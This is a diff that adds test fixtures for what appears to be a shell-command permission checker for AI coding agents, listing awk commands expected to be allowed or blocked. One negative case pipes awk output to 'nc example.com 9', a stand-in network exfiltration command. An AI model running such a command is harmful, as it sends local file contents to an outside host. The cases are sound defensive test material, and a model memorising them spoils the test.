@@ -14808,6 +14808,128 @@
       "expect": "allow"
     },
     {
+      "id": "awk-posix-class-blank-line-numbers",
+      "fix_area": "read",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp",
+        "cursor"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "awk '/^[[:space:]]*$/ {print NR}' README.md"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "awk-posix-class-long-indented-strings",
+      "fix_area": "read",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp",
+        "cursor"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "awk 'length($0) > 85 && /^[[:space:]]*\"/' tests/sample.test.ts"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "awk-posix-class-digit-field",
+      "fix_area": "read",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp",
+        "cursor"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "awk '$1 ~ /^[[:digit:]]+$/ {print $2}' README.md"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "awk-posix-class-negated-and-nested",
+      "fix_area": "read",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp",
+        "cursor"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "awk '/[^[:space:]]/ {print FNR}' README.md"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "neg-awk-posix-class-hides-network-pipe",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp",
+        "cursor"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "awk '{ print /[[:space:]]/ | \"nc example.com 9\" }' README.md"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow",
+      "contained_ok": true
+    },
+    {
+      "id": "neg-awk-posix-class-then-file-write",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp",
+        "cursor"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "awk '/[[:space:]]/ { print > \"out.txt\" }' README.md"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow",
+      "contained_ok": true
+    },
+    {
+      "id": "neg-awk-unknown-bracket-word",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp",
+        "cursor"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "awk '/[[:bogus:]]/ {print}' README.md"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow",
+      "contained_ok": true
+    },
+    {
       "id": "neg-awk-division-pipe-to-network",
       "fix_area": "negative",
       "harnesses": [
